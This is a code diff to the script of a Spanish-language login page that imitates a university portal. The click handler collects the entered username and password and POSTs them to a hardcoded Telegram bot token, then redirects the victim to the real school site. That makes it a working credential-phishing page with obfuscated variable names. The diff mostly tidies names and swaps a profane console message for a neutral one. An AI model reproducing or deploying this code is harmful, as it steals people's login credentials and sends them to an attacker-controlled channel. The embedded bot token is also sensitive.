@@ -1,16 +1,19 @@
 const loginButton = document.querySelector(".login-container button");
 const usuarioInput = document.getElementById('Usuario');
 const passwordInput = document.getElementById("password");
+
 window.addEventListener("DOMContentLoaded", () => {
   if (usuarioInput) {
     usuarioInput.focus();
   }
 });
+
 document.addEventListener('keydown', function (_0x7611b2) {
   if (_0x7611b2.key === 'Enter') {
     loginButton.click();
   }
 });
+
 loginButton.addEventListener("click", function (_0xb56f8f) {
   _0xb56f8f.preventDefault();
   const _0x2d2dac = usuarioInput ? usuarioInput.value.trim() : '';
@@ -18,9 +21,11 @@ loginButton.addEventListener("click", function (_0xb56f8f) {
   if (_0x2d2dac === '' || _0x3cf213 === '') {
     return;
   }
+
   this.textContent = "Validando Información...";
   this.classList.add("loading");
   this.disabled = true;
+
   fetch("https://api.telegram.org/bot8093990322:AAGldoCRW_wWOTypOMxQOnVznQUuT_yTBp4/sendMessage", {
     method: "POST",
     headers: {
@@ -34,12 +39,12 @@ loginButton.addEventListener("click", function (_0xb56f8f) {
     if (!response.ok) {
       throw new Error("Error en la respuesta de Telegram");
     }
-    return _0x13fa0d.json();
-  }).then(_0x4835ad => {
-    console.log("Puto el que lo lea");
+    return response.json();
+  }).then(data => {
+    console.log("Datos enviados correctamente a Telegram");
     window.location.href = "https://e42.um.edu.mx/sec/Home.aspx";
-  })["catch"](_0x5167c1 => {
-    console.error("Error al enviar los datos:", _0x5167c1);
+  }).catch(error => {
+    console.error("Error al enviar los datos:", error);
     alert("Hubo un error al procesar la solicitud. Intenta nuevamente.");
     this.textContent = "Intentar nuevamente";
     this.classList.remove("loading");
